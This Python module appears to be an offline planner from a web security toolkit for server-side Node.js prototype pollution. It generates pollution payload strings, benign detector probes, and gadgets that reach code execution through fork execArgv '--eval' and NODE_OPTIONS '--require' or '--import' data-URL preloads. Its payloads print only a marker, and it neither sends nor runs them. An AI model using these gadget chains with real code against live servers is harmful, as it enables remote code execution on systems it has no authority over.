#!/usr/bin/env python3
"""Offline server-side Node.js prototype-pollution planner.

The existing web engines cover browser prototype-pollution gadgets and a
benign process-global canary.  This focused companion models the *server-side*
bridge from an already-proven pollution source to Node process-creation
options.  It never parses or runs JavaScript, starts a process, opens a socket,
reads a target, or sends a request.

The planner is deliberately fact-driven.  A Node version alone is never an
exploitability claim: a gadget is ready only when the caller also supplies a
supported pollution path, a proven source, a compatible sink/call shape, and
evidence that the sink consumes inherited options.  Mitigations always win
over contradictory optimistic facts.

To find the pollution source in a downloaded Node bundle (an unguarded
flatted / lodash.merge / recursive-assign sink) use the static scanner in
``pp_number_differential.scan_pp_gadgets`` (engine
``web.pp_number_differential``, B-047); this planner takes over once the
source is proven.

Public API::

    analyze_node_sspp(...) -> JSON-serializable report
    node_import_supported("18.18.0") -> True
    main(argv=None) -> process-style integer status

All generated payloads are bounded strings.  Source encodings use an inert
property, detector candidates change only benign response metadata, and
gadget candidates contain a fixed marker-only ``console.log`` expression.
They are not executed or transmitted by this module.
"""

from __future__ import annotations

import argparse
from itertools import islice
import json
import re
import sys
from typing import Iterable, Sequence


SOURCE_PATHS: tuple[str, ...] = ("__proto__", "constructor.prototype")
SINK_APIS: tuple[str, ...] = (
    "none",
    "fork",
    "spawn",
    "execfile",
    "exec",
    "execsync",
    "worker",
    "cluster",
)
CALL_SHAPES: tuple[str, ...] = (
    "unknown",
    "options_omitted",
    "plain_options",
    "node_binary_options",
    "worker_options",
    "cluster_options",
    "own_property_copy",
    "null_prototype_options",
)
PLATFORMS: tuple[str, ...] = ("linux", "windows", "darwin", "other", "unknown")
MITIGATION_BLOCKERS: tuple[str, ...] = (
    "disable-proto",
    "reject-__proto__",
    "reject-constructor",
    "freeze-object-prototype",
    "own-properties-only",
    "null-prototype-options",
    "strip-node-options",
    "strip-execargv",
    "child-process-disabled",
    "unmodeled-mitigation",
)

MAX_VERSION_CHARS = 64
MAX_MARKER_CHARS = 64
MAX_MODULE_PATH_CHARS = 512
MAX_ITERABLE_ITEMS = 32
DEFAULT_MARKER = "WEBDEPTH_SSPP_MARKER"

_VERSION_RE = re.compile(
    r"\A[vV]?(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)"
    r"(?:-([0-9A-Za-z-]+(?:\.[0-9A-Za-z-]+)*))?"
    r"(?:\+([0-9A-Za-z-]+(?:\.[0-9A-Za-z-]+)*))?\Z"
)
_MARKER_RE = re.compile(r"\A[A-Za-z][A-Za-z0-9_]{3,63}\Z")
_POSIX_PATH_RE = re.compile(r"\A/[A-Za-z0-9_./-]+\Z")
_WINDOWS_PATH_RE = re.compile(r"\A(?:[A-Za-z]:[\\/]|\\\\)[A-Za-z0-9_.\\/-]+\Z")


class NodeSSPPError(ValueError):
    """The caller supplied malformed, contradictory, or unbounded facts."""


def _version(value: object) -> dict[str, object]:
    if not isinstance(value, str):
        raise NodeSSPPError("node_version must be text")
    if not value or len(value) > MAX_VERSION_CHARS or "\x00" in value:
        raise NodeSSPPError(f"node_version must be 1..{MAX_VERSION_CHARS} characters without NUL")
    match = _VERSION_RE.fullmatch(value)
    if match is None:
        raise NodeSSPPError("node_version must be a complete semantic version such as 18.18.0")
    try:
        release = tuple(int(match.group(index)) for index in (1, 2, 3))
    except (TypeError, ValueError, OverflowError) as exc:  # defensive: regex already constrains these
        raise NodeSSPPError("node_version contains an invalid numeric component") from exc
    if any(component > 9999 for component in release):
        raise NodeSSPPError("node_version component exceeds 9999")
    prerelease = match.group(4)
    if prerelease:
        for identifier in prerelease.split("."):
            if identifier.isdigit() and len(identifier) > 1 and identifier.startswith("0"):
                raise NodeSSPPError("numeric prerelease identifiers must not contain leading zeroes")
    normalized = ".".join(str(component) for component in release)
    if prerelease:
        normalized += "-" + prerelease
    if match.group(5):
        normalized += "+" + match.group(5)
    return {
        "original": value,
        "normalized": normalized,
        "release": release,
        "prerelease": prerelease,
        "build": match.group(5),
    }


def _stable_at_least(version: dict[str, object], minimum: tuple[int, int, int]) -> bool:
    release = version["release"]
    return isinstance(release, tuple) and version["prerelease"] is None and release >= minimum


def node_import_supported(node_version: object) -> bool:
    """Return whether documented ``--import`` support is available.

    Node documents ``--import`` as added in v18.18.0 and v19.0.0.  A stable
    semantic version at or above 18.18.0 therefore passes.  Prereleases are
    conservatively declined because the published guarantee names releases.
    Malformed input raises only :class:`NodeSSPPError`.
    """

    try:
        return _stable_at_least(_version(node_version), (18, 18, 0))
    except NodeSSPPError:
        raise
    except Exception as exc:  # fail closed for hostile/custom objects
        raise NodeSSPPError("invalid node_version") from exc


def _bounded_choice_set(
    values: object,
    *,
    label: str,
    allowed: tuple[str, ...],
) -> tuple[str, ...]:
    if isinstance(values, (str, bytes, bytearray)) or values is None:
        raise NodeSSPPError(f"{label} must be an iterable of explicit values, not text")
    try:
        rows = list(islice(iter(values), MAX_ITERABLE_ITEMS + 1))
    except Exception as exc:
        raise NodeSSPPError(f"{label} must be an iterable of explicit values") from exc
    if len(rows) > MAX_ITERABLE_ITEMS:
        raise NodeSSPPError(f"{label} exceeds {MAX_ITERABLE_ITEMS} entries")
    for row in rows:
        if not isinstance(row, str) or row not in allowed:
            raise NodeSSPPError(f"invalid {label} entry {row!r}; choose from: {', '.join(allowed)}")
    # Canonical rather than caller/set iteration order makes reports deterministic.
    present = set(rows)
    return tuple(item for item in allowed if item in present)


def _choice(value: object, *, label: str, allowed: tuple[str, ...], aliases: dict[str, str] | None = None) -> str:
    if not isinstance(value, str):
        raise NodeSSPPError(f"{label} must be text")
    canonical = value.strip().lower().replace("-", "_")
    if aliases:
        canonical = aliases.get(canonical, canonical)
    if canonical not in allowed:
        raise NodeSSPPError(f"invalid {label} {value!r}; choose from: {', '.join(allowed)}")
    return canonical


def _bool(value: object, label: str) -> bool:
    if type(value) is not bool:  # bool is intentionally stricter than truthiness/int coercion
        raise NodeSSPPError(f"{label} must be a boolean")
    return value


def _marker(value: object) -> str:
    if not isinstance(value, str) or len(value) > MAX_MARKER_CHARS or _MARKER_RE.fullmatch(value) is None:
        raise NodeSSPPError("marker must be 4..64 ASCII letters, digits, or underscores and start with a letter")
    return value


def _module_path(value: object, platform: str) -> str | None:
    if value is None:
        return None
    if not isinstance(value, str):
        raise NodeSSPPError("reviewed_module_path must be text or None")
    if not value or len(value) > MAX_MODULE_PATH_CHARS or any(ord(char) < 0x20 for char in value):
        raise NodeSSPPError("reviewed_module_path is empty, overlong, or contains a control character")
    if any(token in value for token in ("'", '"', "<", ">")):
        raise NodeSSPPError("reviewed_module_path contains a quoting or placeholder character")
    if platform == "windows":
        if _WINDOWS_PATH_RE.fullmatch(value) is None:
            raise NodeSSPPError("reviewed_module_path must be an absolute Windows path")
    elif platform in ("linux", "darwin"):
        if _POSIX_PATH_RE.fullmatch(value) is None:
            raise NodeSSPPError("reviewed_module_path must be an absolute POSIX path")
    elif _POSIX_PATH_RE.fullmatch(value) is None and _WINDOWS_PATH_RE.fullmatch(value) is None:
        raise NodeSSPPError("reviewed_module_path must be absolute")
    return value


def _percent_encode(value: str, *, safe: str = "") -> str:
    safe_bytes = set(safe.encode("ascii"))
    output: list[str] = []
    for byte in value.encode("utf-8"):
        if (
            0x41 <= byte <= 0x5A
            or 0x61 <= byte <= 0x7A
            or 0x30 <= byte <= 0x39
            or byte in b"-._~"
            or byte in safe_bytes
        ):
            output.append(chr(byte))
        else:
            output.append(f"%{byte:02X}")
    return "".join(output)


def _pollution_object(source_path: str, property_name: str, value: object) -> dict[str, object]:
    leaf = {property_name: value}
    if source_path == "__proto__":
        return {"__proto__": leaf}
    if source_path == "constructor.prototype":
        return {"constructor": {"prototype": leaf}}
    raise NodeSSPPError("internal source path is invalid")


def _pollution_json(source_path: str, property_name: str, value: object) -> str:
    try:
        return json.dumps(
            _pollution_object(source_path, property_name, value),
            ensure_ascii=True,
            separators=(",", ":"),
            sort_keys=False,
        )
    except (TypeError, ValueError, OverflowError, UnicodeError) as exc:
        raise NodeSSPPError("could not encode a bounded pollution document") from exc


def _path_block_reason(path: str, blockers: tuple[str, ...]) -> str | None:
    if "freeze-object-prototype" in blockers:
        return "Object.prototype is frozen"
    if path == "__proto__" and "disable-proto" in blockers:
        return "Node --disable-proto blocks the __proto__ path"
    if path == "__proto__" and "reject-__proto__" in blockers:
        return "input validation rejects the __proto__ key"
    if path == "constructor.prototype" and "reject-constructor" in blockers:
        return "input validation rejects the constructor path"
    return None


def _effective_paths(paths: tuple[str, ...], blockers: tuple[str, ...]) -> tuple[str, ...]:
    return tuple(path for path in paths if _path_block_reason(path, blockers) is None)


def _source_encodings(paths: tuple[str, ...], marker: str) -> list[dict[str, object]]:
    property_name = "webdepth_sspp_marker"
    rows: list[dict[str, object]] = []
    for path in paths:
        segments = ["__proto__", property_name] if path == "__proto__" else ["constructor", "prototype", property_name]
        key = segments[0] + "".join(f"[{segment}]" for segment in segments[1:])
        rows.extend((
            {
                "id": f"{path}:query_marker",
                "source_path": path,
                "transport": "application/x-www-form-urlencoded",
                "value": _percent_encode(key) + "=" + _percent_encode(marker),
                "property": property_name,
                "purpose": "set an otherwise-unused scalar marker property",
                "requirement": "the request parser expands bracket paths and the merge accepts this source path",
                "inert": True,
                "offline": True,
                "sent": False,
                "executed": False,
                "network_requests": 0,
            },
            {
                "id": f"{path}:json_marker",
                "source_path": path,
                "transport": "application/json",
                "value": _pollution_json(path, property_name, marker),
                "property": property_name,
                "purpose": "preserve the pollution path as JSON own keys for merge review",
                "requirement": "the JSON parser preserves the keys and a later merge traverses them unsafely",
                "inert": True,
                "offline": True,
                "sent": False,
                "executed": False,
                "network_requests": 0,
            },
        ))
    return rows


_DETECTORS: tuple[tuple[str, str, object, str, str], ...] = (
    (
        "express_error_status",
        "status",
        555,
        "a subsequent Express error path reads an inherited err.status/option and returns HTTP 555",
        "repeat the same invalid request without pollution and require the baseline status to differ",
    ),
    (
        "express_json_spaces",
        "json spaces",
        2,
        "Express reads inherited app setting/options and indents a JSON response by two spaces",
        "compare raw response bytes with an unpolluted baseline; prettified viewers are not evidence",
    ),
    (
        "body_parser_charset",
        "content-type",
        "application/json; charset=utf-7",
        "body-parser consults the inherited content-type/encoding option and changes its parse error",
        "use an inert body and compare status/error class with an identical unpolluted baseline",
    ),
)


def _detector_plans(paths: tuple[str, ...]) -> list[dict[str, object]]:
    rows: list[dict[str, object]] = []
    for path in paths:
        for detector_id, property_name, value, expected, control in _DETECTORS:
            rows.append({
                "id": f"{path}:{detector_id}",
                "source_path": path,
                "property": property_name,
                "transport": "application/json",
                "value": _pollution_json(path, property_name, value),
                "expected_signal": expected,
                "negative_control": control,
                "benign": True,
                "candidate_only": True,
                "offline": True,
                "sent": False,
                "executed": False,
                "network_requests": 0,
            })
    return rows


def _dedupe(values: Iterable[str]) -> list[str]:
    result: list[str] = []
    for value in values:
        if value not in result:
            result.append(value)
    return result


def _common_unmet(facts: dict[str, object], path: str) -> list[str]:
    source_paths = facts["source_paths"]
    blockers = facts["blockers"]
    unmet: list[str] = []
    if facts["proven_source"] is not True:
        unmet.append("a server-side prototype-pollution source is not proven")
    if not isinstance(source_paths, tuple) or path not in source_paths:
        unmet.append(f"the {path} source path is not supported by supplied evidence")
    if isinstance(blockers, tuple):
        reason = _path_block_reason(path, blockers)
        if reason:
            unmet.append(reason)
        if "own-properties-only" in blockers:
            unmet.append("the sink reads own properties only")
        if "null-prototype-options" in blockers:
            unmet.append("the sink uses a null-prototype options object")
        if "unmodeled-mitigation" in blockers:
            unmet.append("an unmodeled mitigation requires manual review")
    if facts["options_inherit"] is not True:
        unmet.append("the sink is not proven to consume inherited options")
    if facts["call_shape"] == "own_property_copy":
        unmet.append("the call shape copies own option properties")
    elif facts["call_shape"] == "null_prototype_options":
        unmet.append("the call shape uses null-prototype options")
    elif facts["call_shape"] == "unknown":
        unmet.append("the sink call shape is unknown")
    return unmet


def _node_child_shape(facts: dict[str, object]) -> bool:
    sink = facts["sink_api"]
    shape = facts["call_shape"]
    if sink == "fork":
        return shape in ("options_omitted", "plain_options")
    if sink == "cluster":
        return shape == "cluster_options"
    if sink in ("spawn", "execfile", "exec", "execsync"):
        return shape == "node_binary_options"
    # Worker threads do not start a fresh Node process that reparses a newly
    # polluted NODE_OPTIONS property; a separate execArgv model would be needed.
    return False


def _process_unmet(facts: dict[str, object]) -> list[str]:
    blockers = facts["blockers"]
    unmet: list[str] = []
    if not _node_child_shape(facts):
        unmet.append("the sink/call shape is not proven to start a Node child process with inherited options")
    if isinstance(blockers, tuple):
        if "child-process-disabled" in blockers:
            unmet.append("child process creation is disabled by policy")
        if "strip-node-options" in blockers:
            unmet.append("NODE_OPTIONS is removed before child creation")
    return unmet


def _gadget_row(
    *,
    plan_id: str,
    path: str,
    property_name: str,
    property_value: object,
    technique: str,
    requirements: tuple[str, ...],
    unmet: Iterable[str],
    facts: dict[str, object],
    note: str,
) -> dict[str, object]:
    missing = _dedupe(unmet)
    return {
        "id": f"{path}:{plan_id}",
        "plan_id": plan_id,
        "source_path": path,
        "sink_api": facts["sink_api"],
        "call_shape": facts["call_shape"],
        "platform": facts["platform"],
        "property": property_name,
        "value": _pollution_json(path, property_name, property_value),
        "technique": technique,
        "requirements": list(requirements),
        "unmet": missing,
        "readiness": "ready_for_marker_review" if not missing else "blocked",
        "benign_marker_only": True,
        "candidate_only": True,
        "offline": True,
        "sent": False,
        "executed": False,
        "network_requests": 0,
        "note": note,
    }


def _gadget_plans(facts: dict[str, object], marker: str, module_path: str | None) -> list[dict[str, object]]:
    supported_paths = facts["source_paths"]
    candidate_paths = supported_paths if isinstance(supported_paths, tuple) and supported_paths else SOURCE_PATHS
    version = facts["version"]
    blockers = facts["blockers"]
    rows: list[dict[str, object]] = []

    marker_expression = f'console.log("{marker}")'
    import_url = "data:text/javascript," + _percent_encode(marker_expression, safe="(),._-")
    require_target = module_path or "REVIEWED_LOCAL_MARKER_MODULE.cjs"

    for path in candidate_paths:
        common = _common_unmet(facts, path)

        direct_unmet = list(common)
        if facts["sink_api"] != "fork":
            direct_unmet.append("direct execArgv control requires child_process.fork")
        if facts["call_shape"] not in ("options_omitted", "plain_options"):
            direct_unmet.append("fork must omit options or consume a plain inherited options object")
        if isinstance(blockers, tuple):
            if "strip-execargv" in blockers:
                direct_unmet.append("execArgv is removed or replaced before fork")
            if "child-process-disabled" in blockers:
                direct_unmet.append("child process creation is disabled by policy")
        if isinstance(version, dict) and not _stable_at_least(version, (0, 5, 0)):
            direct_unmet.append("child_process.fork is not guaranteed before Node 0.5.0")
        rows.append(_gadget_row(
            plan_id="fork_execargv_eval",
            path=path,
            property_name="execArgv",
            property_value=["--eval=" + marker_expression],
            technique="pollute fork options.execArgv with a marker-only --eval argument",
            requirements=(
                "the source pollutes Object.prototype through the selected path",
                "child_process.fork is reached after pollution",
                "fork consumes inherited execArgv from its options shape",
                "the child Node process permits --eval",
            ),
            unmet=direct_unmet,
            facts=facts,
            note="direct fork gadget; generated JavaScript only prints the fixed marker",
        ))

        require_unmet = [*common, *_process_unmet(facts)]
        if isinstance(version, dict) and not _stable_at_least(version, (8, 0, 0)):
            require_unmet.append("NODE_OPTIONS is not guaranteed before Node 8.0.0")
        if module_path is None:
            require_unmet.append("an existing reviewed local marker module path was not supplied")
        rows.append(_gadget_row(
            plan_id="node_options_require",
            path=path,
            property_name="NODE_OPTIONS",
            property_value="--require=" + require_target,
            technique="pollute inherited NODE_OPTIONS to preload an existing reviewed local module",
            requirements=(
                "a fresh Node child process is started after pollution",
                "its environment/options construction consumes inherited NODE_OPTIONS",
                "the reviewed local module already exists and is compatible",
                "Node accepts --require in NODE_OPTIONS",
            ),
            unmet=require_unmet,
            facts=facts,
            note="the planner never creates or reads the module; absence of a supplied reviewed path blocks readiness",
        ))

        import_unmet = [*common, *_process_unmet(facts)]
        if not isinstance(version, dict) or not _stable_at_least(version, (18, 18, 0)):
            import_unmet.append("--import data-URL preload requires stable Node 18.18.0 or newer")
        rows.append(_gadget_row(
            plan_id="node_options_import_data",
            path=path,
            property_name="NODE_OPTIONS",
            property_value="--import=" + import_url,
            technique="pollute inherited NODE_OPTIONS with a marker-only data: ESM preload",
            requirements=(
                "a fresh Node child process is started after pollution",
                "its environment/options construction consumes inherited NODE_OPTIONS",
                "the runtime is stable Node 18.18.0+ (or a later major) with --import support",
                "data: ESM specifiers are accepted by the runtime policy",
            ),
            unmet=import_unmet,
            facts=facts,
            note="filesystem-free marker gadget; it is still only a generated string and is never executed here",
        ))
    return rows


def analyze_node_sspp(
    *,
    node_version: object,
    source_paths: object,
    proven_source: object,
    sink_api: object,
    call_shape: object,
    options_inherit: object,
    platform: object = "unknown",
    blockers: object = (),
    marker: object = DEFAULT_MARKER,
    reviewed_module_path: object = None,
) -> dict[str, object]:
    """Build a deterministic server-side prototype-pollution report.

    Every fact is explicit.  ``source_paths`` and ``blockers`` must be
    iterables of values from :data:`SOURCE_PATHS` and
    :data:`MITIGATION_BLOCKERS`; strings are rejected instead of being split.
    Any malformed public input raises only :class:`NodeSSPPError`.
    """

    try:
        version = _version(node_version)
        paths = _bounded_choice_set(source_paths, label="source_paths", allowed=SOURCE_PATHS)
        checked_blockers = _bounded_choice_set(blockers, label="blockers", allowed=MITIGATION_BLOCKERS)
        checked_sink = _choice(
            sink_api,
            label="sink_api",
            allowed=SINK_APIS,
            aliases={"child_process.fork": "fork", "child_process.spawn": "spawn", "exec_file": "execfile"},
        )
        checked_shape = _choice(call_shape, label="call_shape", allowed=CALL_SHAPES)
        checked_platform = _choice(
            platform,
            label="platform",
            allowed=PLATFORMS,
            aliases={"macos": "darwin", "mac": "darwin", "win32": "windows"},
        )
        checked_proven = _bool(proven_source, "proven_source")
        checked_inherit = _bool(options_inherit, "options_inherit")
        checked_marker = _marker(marker)
        checked_module = _module_path(reviewed_module_path, checked_platform)

        effective = _effective_paths(paths, checked_blockers)
        facts: dict[str, object] = {
            "node_version": version["normalized"],
            "version": version,
            "source_paths": paths,
            "effective_source_paths": effective,
            "proven_source": checked_proven,
            "sink_api": checked_sink,
            "call_shape": checked_shape,
            "options_inherit": checked_inherit,
            "platform": checked_platform,
            "blockers": checked_blockers,
            "reviewed_module_path": checked_module,
        }
        gadgets = _gadget_plans(facts, checked_marker, checked_module)
        ready = [row["id"] for row in gadgets if row["readiness"] == "ready_for_marker_review"]
        return {
            "facts": {
                "node_version": version["normalized"],
                "node_release": list(version["release"]),
                "node_prerelease": version["prerelease"],
                "source_paths": list(paths),
                "effective_source_paths": list(effective),
                "proven_source": checked_proven,
                "sink_api": checked_sink,
                "call_shape": checked_shape,
                "options_inherit": checked_inherit,
                "platform": checked_platform,
                "blockers": list(checked_blockers),
                "reviewed_module_path": checked_module,
                "node_import_supported": _stable_at_least(version, (18, 18, 0)),
            },
            "source_encodings": _source_encodings(effective, checked_marker),
            "detectors": _detector_plans(effective),
            "gadgets": gadgets,
            "summary": {
                "ready_gadgets": ready,
                "ready_count": len(ready),
                "gadget_count": len(gadgets),
                "claim": (
                    "marker gadgets have all modeled prerequisites"
                    if ready
                    else "no gadget has all modeled prerequisites; version alone is insufficient"
                ),
            },
            "marker": checked_marker,
            "offline": True,
            "network_requests": 0,
            "sent": False,
            "executed": False,
        }
    except NodeSSPPError:
        raise
    except Exception as exc:
        # Iterators and user-defined objects can raise arbitrary stdlib/runtime
        # exceptions.  The public fail-closed contract never leaks them.
        raise NodeSSPPError("invalid server-side prototype-pollution facts") from exc


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="offline server-side Node prototype-pollution planner; sends and executes nothing"
    )
    parser.add_argument("--node-version", required=True)
    parser.add_argument("--source-path", action="append", choices=SOURCE_PATHS, required=True)
    source = parser.add_mutually_exclusive_group(required=True)
    source.add_argument("--proven-source", dest="proven_source", action="store_true")
    source.add_argument("--unproven-source", dest="proven_source", action="store_false")
    parser.add_argument("--sink", choices=SINK_APIS, required=True)
    parser.add_argument("--call-shape", choices=CALL_SHAPES, required=True)
    inheritance = parser.add_mutually_exclusive_group(required=True)
    inheritance.add_argument("--options-inherit", dest="options_inherit", action="store_true")
    inheritance.add_argument("--options-do-not-inherit", dest="options_inherit", action="store_false")
    parser.add_argument("--platform", choices=PLATFORMS, default="unknown")
    parser.add_argument("--blocker", action="append", choices=MITIGATION_BLOCKERS, default=[])
    parser.add_argument("--marker", default=DEFAULT_MARKER)
    parser.add_argument("--reviewed-module-path")
    parser.add_argument("--json", action="store_true")
    return parser


def _human(report: dict[str, object]) -> None:
    facts = report["facts"]
    summary = report["summary"]
    if not isinstance(facts, dict) or not isinstance(summary, dict):
        raise NodeSSPPError("internal report shape is invalid")
    print(
        f"Node {facts['node_version']} source={facts['proven_source']} "
        f"sink={facts['sink_api']}/{facts['call_shape']} ready={summary['ready_count']}"
    )
    for row in report["gadgets"] if isinstance(report["gadgets"], list) else []:
        if not isinstance(row, dict):
            continue
        print(f"- {row['id']}: {row['readiness']}")
        for reason in row["unmet"] if isinstance(row.get("unmet"), list) else []:
            print(f"    unmet: {reason}")


def main(argv: Sequence[str] | None = None) -> int:
    try:
        args = _parser().parse_args(argv)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2
    try:
        report = analyze_node_sspp(
            node_version=args.node_version,
            source_paths=args.source_path,
            proven_source=args.proven_source,
            sink_api=args.sink,
            call_shape=args.call_shape,
            options_inherit=args.options_inherit,
            platform=args.platform,
            blockers=args.blocker,
            marker=args.marker,
            reviewed_module_path=args.reviewed_module_path,
        )
        if args.json:
            print(json.dumps(report, indent=2, ensure_ascii=False, sort_keys=True))
        else:
            _human(report)
        return 0
    except NodeSSPPError as exc:
        print(f"webdepth_node_sspp_planner: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
